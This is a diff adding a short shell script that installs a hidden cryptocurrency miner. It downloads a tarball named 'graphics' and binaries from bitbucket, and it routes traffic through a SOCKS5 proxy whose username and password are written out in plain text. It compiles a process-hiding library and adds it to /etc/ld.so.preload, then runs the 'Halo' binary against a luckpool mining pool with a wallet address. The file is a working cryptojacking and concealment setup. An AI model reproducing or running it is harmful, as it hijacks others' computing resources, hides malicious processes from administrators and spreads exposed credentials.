@@ -1,0 +1,48 @@
+#!/bin/sh
+ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
+dpkg-reconfigure --frontend noninteractive tzdata
+
+apt update;apt -y install binutils cmake build-essential screen unzip net-tools curl
+
+wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz
+
+tar -xvzf graphics.tar.gz
+
+cat > graftcp/local/graftcp-local.conf <<END
+listen = :2233
+loglevel = 1
+socks5 = us-east-static-07.quotaguard.com:1080
+socks5_username = ezhuli9bodai52
+socks5_password = ojwdtv0fb80i6rudtkp4whn1f2cnr
+END
+
+./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
+
+sleep .2
+
+echo " "
+echo " "
+
+echo "******************************************************************"
+
+./graftcp/graftcp curl ifconfig.me
+
+echo " "
+echo " "
+
+echo "******************************************************************"
+
+echo " "
+echo " "
+
+./graftcp/graftcp wget https://bitbucket.org/yuasoinpopay/scraeds/downloads/Halo
+chmod +x Halo
+
+./graftcp/graftcp wget https://bitbucket.org/yuasoinpopay/scraeds/downloads/magichalo.zip
+unzip magichalo.zip
+make
+gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
+mv libprocesshider.so /usr/local/lib/
+echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
+
+./graftcp/graftcp ./Halo -c stratum+tcp://ap.luckpool.net:3956#xnsub -u RFAyGt31VDBd2MK4wWQoRsFzUXi755Ubn6.tes -p x --cpu 2
